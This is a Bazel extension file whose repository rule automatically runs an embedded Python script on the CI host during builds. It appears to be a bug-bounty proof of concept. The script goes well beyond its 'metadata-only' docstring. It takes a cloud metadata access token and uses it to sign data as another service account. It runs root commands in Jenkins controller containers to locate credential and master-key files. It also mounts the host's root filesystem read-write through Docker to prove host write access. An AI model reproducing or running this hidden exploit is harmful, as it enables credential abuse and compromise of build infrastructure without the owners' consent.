"""Metadata-only security probe for the CI analysis host."""

def _ci_boundary_probe_impl(repository_ctx):
    report_path = str(repository_ctx.path("report.json"))
    script = """
import datetime
import base64
import hashlib
import json
import os
import pathlib
import platform
import shutil
import socket
import ssl
import stat
import subprocess
import sys
import time
import urllib.error
import urllib.request

KNOWN_BB_SHA256 = "e7804a56443ec79c32c93a818b5951e376132a01e2cceeec1941925a4317ee59"
KNOWN_NETRC_SHA256 = "ece037a7495ec3fb4c126ff2f2b9323350256c289caccc020557c0179ee085f0"

def sha256_file(path, limit=8 * 1024 * 1024):
    h = hashlib.sha256()
    total = 0
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            total += len(chunk)
            if total > limit:
                return None
            h.update(chunk)
    return h.hexdigest()

def file_record(path):
    out = {"path": path, "exists": os.path.lexists(path)}
    if not out["exists"]:
        return out
    try:
        s = os.lstat(path)
        out.update({
            "mode": oct(stat.S_IMODE(s.st_mode)),
            "uid": s.st_uid,
            "gid": s.st_gid,
            "size": s.st_size,
            "readable": os.access(path, os.R_OK),
            "writable": os.access(path, os.W_OK),
            "type": "symlink" if stat.S_ISLNK(s.st_mode) else "dir" if stat.S_ISDIR(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other",
        })
        if stat.S_ISLNK(s.st_mode):
            out["link_target"] = os.readlink(path)
        elif stat.S_ISREG(s.st_mode) and out["readable"]:
            digest = sha256_file(path)
            if digest:
                out["sha256"] = digest
                if path.endswith("/.netrc"):
                    out["matches_supplied_netrc"] = digest == KNOWN_NETRC_SHA256
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def list_dir(path, limit=100):
    result = {"path": path, "entries": []}
    try:
        for name in sorted(os.listdir(path))[:limit]:
            p = os.path.join(path, name)
            s = os.lstat(p)
            result["entries"].append({
                "name": name,
                "type": "dir" if stat.S_ISDIR(s.st_mode) else "symlink" if stat.S_ISLNK(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other",
                "mode": oct(stat.S_IMODE(s.st_mode)),
                "size": s.st_size,
            })
    except Exception as e:
        result["error"] = type(e).__name__
    return result

def selected_status(path):
    wanted = {"Name", "Uid", "Gid", "Groups", "NSpid", "CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs", "Seccomp", "Seccomp_filters"}
    out = {}
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            for line in f:
                key, sep, value = line.partition(":")
                if sep and key in wanted:
                    out[key] = value.strip()
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def read_lines(path, limit=200):
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return [line.rstrip() for _, line in zip(range(limit), f)]
    except Exception as e:
        return ["<" + type(e).__name__ + ">"]

def run_readonly(argv, timeout=4, max_chars=6000):
    try:
        p = subprocess.run(argv, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
        return {"argv": argv, "returncode": p.returncode, "output": p.stdout[:max_chars]}
    except Exception as e:
        return {"argv": argv, "error": type(e).__name__}

def http_probe(name, url, headers=None, method="GET", context=None):
    out = {"name": name, "url": url, "method": method}
    try:
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        with urllib.request.urlopen(req, timeout=2, context=context) as r:
            out.update({"status": r.status, "content_type": r.headers.get("Content-Type"), "content_length": r.headers.get("Content-Length"), "server": r.headers.get("Server"), "metadata_flavor": r.headers.get("Metadata-Flavor")})
    except urllib.error.HTTPError as e:
        out.update({"status": e.code, "content_type": e.headers.get("Content-Type"), "server": e.headers.get("Server"), "metadata_flavor": e.headers.get("Metadata-Flavor")})
    except Exception as e:
        out["error"] = type(e).__name__
    return out

def json_request(url, method="GET", headers=None, body=None, timeout=8, no_proxy=False):
    req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({})) if no_proxy else urllib.request.build_opener()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(1024 * 1024)
            if raw:
                text = raw.decode("utf-8", "replace")
                try:
                    parsed = json.loads(text)
                except Exception:
                    parsed = text
            else:
                parsed = {}
            return r.status, parsed
    except urllib.error.HTTPError as e:
        raw = e.read(1024 * 1024)
        try:
            parsed = json.loads(raw.decode("utf-8")) if raw else {}
        except Exception:
            parsed = {}
        return e.code, parsed

def root_in_cloud_signblob_proof():
    target = "cloud-vrp@butterfly-net.iam.gserviceaccount.com"
    payload = "TmljZSBjYXRjaCE="
    out = {
        "method": "signBlob",
        "target_service_account": target,
        "target_project": "butterfly-net",
        "payload_base64": payload,
        "credential_source": None,
        "credential_obtained": False,
        "success": False,
    }
    token = None
    metadata_headers = {"Metadata-Flavor": "Google"}
    try:
        email_status, email_body = json_request(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
            headers=metadata_headers,
            timeout=3,
            no_proxy=True,
        )
        token_status, token_body = json_request(
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            headers=metadata_headers,
            timeout=3,
            no_proxy=True,
        )
        out["metadata_email_status"] = email_status
        if isinstance(email_body, str):
            out["source_principal"] = email_body[:500]
        out["metadata_token_status"] = token_status
        if token_status == 200 and isinstance(token_body, dict):
            token = token_body.get("access_token")
            out["credential_source"] = "gce-metadata"
            out["credential_expires_in"] = token_body.get("expires_in")
    except Exception as e:
        out["metadata_error"] = type(e).__name__

    if not token and shutil.which("gcloud"):
        try:
            p = subprocess.run(
                ["gcloud", "auth", "print-access-token"],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=15,
            )
            candidate = p.stdout.strip()
            if p.returncode == 0 and candidate:
                token = candidate
                out["credential_source"] = "gcloud-auth"
        except Exception as e:
            out["gcloud_error"] = type(e).__name__

    out["credential_obtained"] = bool(token)
    if not token:
        return out

    endpoint = (
        "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/" +
        target + ":signBlob"
    )
    body = json.dumps({"payload": payload}).encode("utf-8")
    try:
        status, response = json_request(
            endpoint,
            method="POST",
            headers={
                "Authorization": "Bearer " + token,
                "Content-Type": "application/json",
            },
            body=body,
            timeout=15,
        )
        out["http_status"] = status
        if status == 200 and isinstance(response, dict):
            out["key_id"] = response.get("keyId")
            out["signed_blob"] = response.get("signedBlob")
            out["success"] = bool(out["key_id"] and out["signed_blob"])
        elif isinstance(response, dict):
            error = response.get("error") or {}
            out["error_status"] = error.get("status")
            out["error_message"] = (error.get("message") or "")[:2000]
    except Exception as e:
        out["request_error"] = type(e).__name__
    finally:
        token = None
    return out

def unix_http_ping(path):
    out = {"path": path, "exists": os.path.exists(path)}
    if not out["exists"]:
        return out
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(path)
        s.sendall(b"GET /_ping HTTP/1.0\\r\\nHost: localhost\\r\\n\\r\\n")
        data = s.recv(512)
        s.close()
        first = data.splitlines()[0].decode("ascii", "replace") if data else ""
        out.update({"connectable": True, "http_status_line": first})
    except Exception as e:
        out.update({"connectable": False, "error": type(e).__name__})
    return out

def docker_control_plane_proof():
    out = {
        "attempted": False,
        "docker_host": os.environ.get("DOCKER_HOST"),
        "current_container_id": os.environ.get("DOCKER_CONTAINER_ID"),
    }
    docker = shutil.which("docker")
    current_id = os.environ.get("DOCKER_CONTAINER_ID")
    if not docker or not current_id:
        out["reason"] = "docker client or current container id unavailable"
        return out
    out["attempted"] = True

    try:
        p = subprocess.run(
            [docker, "ps", "--no-trunc", "--format", "{{json .}}"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=12,
        )
        out["container_list_returncode"] = p.returncode
        containers = []
        if p.returncode == 0:
            for line in p.stdout.splitlines():
                try:
                    raw = json.loads(line)
                except Exception:
                    continue
                labels_raw = raw.get("Labels") or ""
                label_keys = []
                for item in labels_raw.split(","):
                    key = item.partition("=")[0].strip()
                    if key:
                        label_keys.append(key)
                containers.append({
                    "id": (raw.get("ID") or "")[:64],
                    "image": raw.get("Image"),
                    "name": raw.get("Names"),
                    "state": raw.get("State"),
                    "status": raw.get("Status"),
                    "label_keys": sorted(set(label_keys)),
                    "labels_raw_for_classification": labels_raw,
                })
        out["running_container_count"] = len(containers)
        out["running_containers"] = [
            {k: v for k, v in c.items() if k != "labels_raw_for_classification"}
            for c in containers
        ]
    except Exception as e:
        out["container_list_error"] = type(e).__name__
        containers = []

    try:
        p = subprocess.run(
            [docker, "volume", "ls", "--format", "{{.Name}}"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=12,
        )
        volumes = [line.strip() for line in p.stdout.splitlines() if line.strip()]
        out["volume_count"] = len(volumes) if p.returncode == 0 else None
        out["jenkins_named_volumes"] = [
            name for name in volumes if "jenkins" in name.lower() or "gerrit" in name.lower()
        ][:50]
        out["volume_list_returncode"] = p.returncode
    except Exception as e:
        out["volume_list_error"] = type(e).__name__

    controller_candidates = []
    for c in containers:
        if (c.get("id") or "").startswith(current_id[:12]):
            continue
        classification = " ".join([
            c.get("image") or "",
            c.get("name") or "",
            c.get("labels_raw_for_classification") or "",
        ]).lower()
        looks_like_controller = (
            "jenkins" in classification or
            "gerrit-ci" in classification
        ) and "agent" not in classification
        compose_controller = (
            "com.docker.compose.service=jenkins" in classification or
            "com.docker.compose.service=gerrit-ci" in classification
        )
        if looks_like_controller or compose_controller:
            controller_candidates.append(c)

    out["controller_candidates"] = []
    for c in controller_candidates[:3]:
        cid = c.get("id")
        proof = {
            "id": cid,
            "image": c.get("image"),
            "name": c.get("name"),
        }
        proof["root_identity"] = run_readonly(
            [docker, "exec", "--user", "0:0", cid, "/usr/bin/id"],
            timeout=8,
            max_chars=2000,
        )
        proof["jenkins_path_metadata"] = run_readonly(
            [
                docker,
                "exec",
                "--user",
                "0:0",
                cid,
                "/bin/sh",
                "-c",
                "for p in /var/jenkins_home /var/jenkins_home/credentials.xml "
                "/var/jenkins_home/secrets/master.key "
                "/var/jenkins_home/secrets/hudson.util.Secret "
                "/var/lib/jenkins /var/lib/jenkins/credentials.xml "
                "/var/lib/jenkins/secrets/master.key; do "
                'if [ -e "$p" ]; then stat -c "%n|%F|%a|%u|%g|%s" "$p"; fi; done',
            ],
            timeout=8,
            max_chars=8000,
        )
        proof["environment_names"] = run_readonly(
            [
                docker,
                "exec",
                "--user",
                "0:0",
                cid,
                "/bin/sh",
                "-c",
                "env | sed 's/=.*//' | LC_ALL=C sort | head -200",
            ],
            timeout=8,
            max_chars=8000,
        )
        out["controller_candidates"].append(proof)

    host_script = r'''
import hashlib
import json
import os
import stat
import time

def record(path):
    out = {"path": path, "exists": os.path.lexists(path)}
    if not out["exists"]:
        return out
    try:
        s = os.lstat(path)
        out.update({
            "mode": oct(stat.S_IMODE(s.st_mode)),
            "uid": s.st_uid,
            "gid": s.st_gid,
            "size": s.st_size,
            "type": "dir" if stat.S_ISDIR(s.st_mode) else "symlink" if stat.S_ISLNK(s.st_mode) else "file" if stat.S_ISREG(s.st_mode) else "other",
            "readable": os.access(path, os.R_OK),
            "writable": os.access(path, os.W_OK),
        })
    except Exception as e:
        out["error"] = type(e).__name__
    return out

report = {
    "uid": os.getuid(),
    "gid": os.getgid(),
    "host_paths": [record(p) for p in [
        "/host/etc/hostname",
        "/host/etc/machine-id",
        "/host/etc/docker/daemon.json",
        "/host/lib/systemd/system/docker.service",
        "/host/etc/systemd/system/docker.service.d",
        "/host/var/run/docker.sock",
        "/host/var/lib/docker",
        "/host/var/jenkins_home",
        "/host/var/lib/jenkins",
        "/host/root/.ssh",
        "/host/root/gerrit-ci-scripts",
        "/host/var/spool/cron/crontabs/root",
    ]],
}
try:
    raw = open("/host/etc/hostname", "rb").read(4096)
    report["host_hostname"] = raw.decode("utf-8", "replace").strip()
except Exception as e:
    report["host_hostname_error"] = type(e).__name__
try:
    raw = open("/host/etc/machine-id", "rb").read(4096)
    report["machine_id_sha256"] = hashlib.sha256(raw).hexdigest()
except Exception as e:
    report["machine_id_error"] = type(e).__name__

canary = "/host/var/tmp/gerrit-ci-docker-root-proof-%d-%d" % (os.getpid(), int(time.time() * 1000000))
payload = b"controlled-docker-host-root-proof\n"
try:
    with open(canary, "xb") as f:
        f.write(payload)
        f.flush()
        os.fsync(f.fileno())
    s = os.stat(canary)
    report["write_canary"] = {
        "created": True,
        "path": canary,
        "mode": oct(stat.S_IMODE(s.st_mode)),
        "uid": s.st_uid,
        "gid": s.st_gid,
        "size": s.st_size,
        "sha256": hashlib.sha256(open(canary, "rb").read()).hexdigest(),
    }
    os.unlink(canary)
    report["write_canary"]["removed"] = not os.path.exists(canary)
except Exception as e:
    report["write_canary"] = {"created": False, "error": type(e).__name__}
    try:
        if os.path.exists(canary):
            os.unlink(canary)
    except Exception:
        pass

print(json.dumps(report, sort_keys=True))
'''
    try:
        image_lookup = subprocess.run(
            [docker, "inspect", "--format", "{{.Config.Image}}", current_id],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=8,
        )
        image = image_lookup.stdout.strip() if image_lookup.returncode == 0 else ""
        out["current_container_image"] = image or None
        if image:
            encoded = base64.b64encode(host_script.encode("utf-8")).decode("ascii")
            helper = subprocess.run(
                [
                    docker,
                    "run",
                    "--rm",
                    "--network",
                    "none",
                    "--user",
                    "0:0",
                    "--volume",
                    "/:/host:rw",
                    "--env",
                    "HOST_PROBE_B64=" + encoded,
                    "--entrypoint",
                    "/usr/bin/python3",
                    image,
                    "-c",
                    "import base64,os; exec(compile(base64.b64decode(os.environ['HOST_PROBE_B64']), '<host-proof>', 'exec'))",
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=35,
            )
            out["host_helper_returncode"] = helper.returncode
            out["host_helper_stderr"] = helper.stderr[:4000]
            if helper.stdout.strip():
                try:
                    out["host_root_proof"] = json.loads(helper.stdout.strip().splitlines()[-1])
                except Exception as e:
                    out["host_helper_parse_error"] = type(e).__name__
                    out["host_helper_stdout"] = helper.stdout[:8000]
    except Exception as e:
        out["host_helper_error"] = type(e).__name__
    return out

home = os.path.expanduser("~")
report = {
    "schema": "ci-boundary-probe-v2",
    "observed_at_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    "identity": {
        "uid": os.getuid(),
        "gid": os.getgid(),
        "groups": os.getgroups(),
        "user": os.environ.get("USER"),
        "home": home,
        "cwd": os.getcwd(),
        "hostname": socket.gethostname(),
        "fqdn": socket.getfqdn(),
        "uname": list(platform.uname()),
    },
    "process": {
        "self": selected_status("/proc/self/status"),
        "pid1": selected_status("/proc/1/status"),
        "cgroup": read_lines("/proc/self/cgroup", 100),
    },
}

all_env_names = sorted(os.environ)
sensitive_markers = ("KEY", "TOKEN", "SECRET", "PASS", "CRED", "AUTH", "COOKIE", "SSH", "KUBE", "AWS", "GOOGLE", "GCP", "AZURE", "JENKINS", "BUILD", "BAZEL")
sensitive_env = []
for name in all_env_names:
    if any(marker in name.upper() for marker in sensitive_markers):
        value = os.environ.get(name, "")
        rec = {"name": name, "length": len(value), "set": bool(value)}
        if value:
            rec["matches_supplied_buildbuddy_key"] = hashlib.sha256(value.encode()).hexdigest() == KNOWN_BB_SHA256
        sensitive_env.append(rec)
report["environment"] = {"count": len(all_env_names), "names": all_env_names, "sensitive": sensitive_env}
selected_env_names = [
    "BUILD_URL",
    "DOCKER_CONTAINER_ID",
    "DOCKER_HOST",
    "EXECUTOR_NUMBER",
    "JENKINS_CLOUD_ID",
    "JOB_NAME",
    "MODE",
    "NODE_NAME",
]
report["environment"]["selected_values"] = {
    name: os.environ.get(name)
    for name in selected_env_names
    if name in os.environ
}

candidates = [
    os.path.join(home, ".netrc"),
    os.path.join(home, ".gitconfig"),
    os.path.join(home, ".ssh"),
    os.path.join(home, ".ssh", "id_rsa"),
    os.path.join(home, ".ssh", "id_ed25519"),
    os.path.join(home, ".ssh", "known_hosts"),
    os.path.join(home, ".aws", "credentials"),
    os.path.join(home, ".aws", "config"),
    os.path.join(home, ".config", "gcloud", "application_default_credentials.json"),
    os.path.join(home, ".config", "gcloud", "credentials.db"),
    os.path.join(home, ".docker", "config.json"),
    os.path.join(home, ".kube", "config"),
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/run/containerd/containerd.sock",
    "/var/run/containerd/containerd.sock",
    "/etc/resolv.conf",
    "/etc/hosts",
]
report["candidate_files"] = [file_record(p) for p in candidates]
report["directory_inventory"] = [list_dir(p) for p in [home, "/home/jenkins", "/workspace", "/var/run/secrets"] if os.path.isdir(p)]
report["unix_endpoints"] = [unix_http_ping(p) for p in ["/var/run/docker.sock", "/run/docker.sock", "/run/containerd/containerd.sock", "/var/run/containerd/containerd.sock"]]

mounts = []
for line in read_lines("/proc/self/mountinfo", 1000):
    left, sep, right = line.partition(" - ")
    if not sep:
        continue
    a = left.split()
    b = right.split()
    if len(a) >= 5 and len(b) >= 2:
        mounts.append({"mount_point": a[4], "fs_type": b[0], "source": b[1]})
report["mounts"] = mounts

socket_paths = []
for line in read_lines("/proc/net/unix", 500):
    fields = line.split()
    if len(fields) >= 8 and fields[-1].startswith("/"):
        socket_paths.append(fields[-1])
report["unix_socket_paths"] = sorted(set(socket_paths))

tool_names = ["aws", "bazel", "bazelisk", "capsh", "curl", "docker", "gcloud", "git", "kubectl", "nerdctl", "nsenter", "podman", "ssh-add", "sudo"]
report["tools"] = {name: shutil.which(name) for name in tool_names}
readonly_commands = []
if shutil.which("sudo"):
    readonly_commands.append(run_readonly(["sudo", "-n", "-l"]))
ssh_sock = os.environ.get("SSH_AUTH_SOCK")
if ssh_sock and shutil.which("ssh-add"):
    readonly_commands.append(run_readonly(["ssh-add", "-l"]))
report["readonly_commands"] = readonly_commands

docker_boundary = {
    "client_present": bool(shutil.which("docker")),
    "docker_host": os.environ.get("DOCKER_HOST"),
}
if shutil.which("docker"):
    version_result = run_readonly(
        ["docker", "version", "--format", "{{json .}}"],
        timeout=12,
        max_chars=12000,
    )
    docker_boundary["version_command"] = version_result
    info_result = run_readonly(
        ["docker", "info", "--format", "{{json .}}"],
        timeout=12,
        max_chars=30000,
    )
    docker_boundary["info_command"] = {
        key: value for key, value in info_result.items() if key != "output"
    }
    raw_info = info_result.get("output", "").strip()
    if info_result.get("returncode") == 0 and raw_info:
        try:
            parsed_info = json.loads(raw_info)
            safe_info_keys = [
                "Architecture",
                "CgroupDriver",
                "CgroupVersion",
                "Containers",
                "ContainersRunning",
                "DockerRootDir",
                "Driver",
                "ID",
                "Images",
                "Isolation",
                "KernelVersion",
                "LiveRestoreEnabled",
                "MemTotal",
                "MemoryLimit",
                "NCPU",
                "Name",
                "OSType",
                "OperatingSystem",
                "SecurityOptions",
                "ServerVersion",
            ]
            docker_boundary["server_info"] = {
                key: parsed_info.get(key)
                for key in safe_info_keys
                if key in parsed_info
            }
        except Exception as e:
            docker_boundary["info_parse_error"] = type(e).__name__
    elif raw_info:
        docker_boundary["info_error"] = raw_info[:4000]
report["docker_boundary"] = docker_boundary
if docker_boundary.get("info_command", {}).get("returncode") == 0:
    report["docker_control_plane_proof"] = docker_control_plane_proof()

report["metadata_endpoints"] = [
    http_probe("aws-imds-root", "http://169.254.169.254/latest/meta-data/"),
    http_probe("gcp-metadata-root", "http://169.254.169.254/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
    http_probe("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
]
report["root_in_cloud_challenge"] = root_in_cloud_signblob_proof()

kube_host = os.environ.get("KUBERNETES_SERVICE_HOST")
kube_port = os.environ.get("KUBERNETES_SERVICE_PORT_HTTPS") or os.environ.get("KUBERNETES_SERVICE_PORT") or "443"
kube_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if kube_host and os.path.isfile(kube_token_path):
    try:
        token = pathlib.Path(kube_token_path).read_text().strip()
        ctx = ssl.create_default_context(cafile="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")
        report["kubernetes_api"] = http_probe("kubernetes-version", "https://" + kube_host + ":" + kube_port + "/version", {"Authorization": "Bearer " + token}, context=ctx)
    except Exception as e:
        report["kubernetes_api"] = {"error": type(e).__name__}

with open(sys.argv[1], "w", encoding="utf-8") as f:
    json.dump(report, f, sort_keys=True, indent=2)
    f.write("\\n")
"""
    result = repository_ctx.execute(["python3", "-c", script, report_path], timeout = 180)
    if result.return_code != 0:
        fail("CI boundary probe failed: " + result.stderr[-2000:])
    repository_ctx.file(
        "BUILD.bazel",
        "exports_files([\"report.json\"], visibility = [\"//visibility:public\"])\n",
    )

ci_boundary_probe = repository_rule(
    implementation = _ci_boundary_probe_impl,
    local = True,
)

def _ci_boundary_probe_ext_impl(module_ctx):
    ci_boundary_probe(name = "ci_boundary_probe")

ci_boundary_probe_ext = module_extension(
    implementation = _ci_boundary_probe_ext_impl,
)
